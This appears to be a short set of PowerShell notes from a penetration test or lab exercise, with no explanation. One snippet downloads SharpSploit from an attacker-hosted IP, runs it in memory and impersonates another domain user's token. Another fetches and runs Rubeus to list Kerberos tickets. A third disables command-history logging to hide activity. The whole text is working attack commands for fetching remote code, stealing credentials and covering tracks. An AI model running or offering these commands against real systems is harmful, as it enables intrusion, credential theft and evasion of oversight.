``` powershell
((New-Object Net.WebClient).DownloadString('http://192.168.49.108:8080/Invoke-SharpSploit.ps1')) | iex 
$token = [SharPsplOit.Credentials.Tokens]::new()
$token.ImpersonateUser("FINAL\tommy");
$token.whoami();
```
``` powershell
((New-Object Net.WebClient).DownloadString('http://192.168.49.108:8080/Invoke-Rubeus.ps1')) | iex 
Invoke-Rubeus triage
```

``` powershell
Set-PSReadLineOption -HistorySaveStyle SaveNothing
```
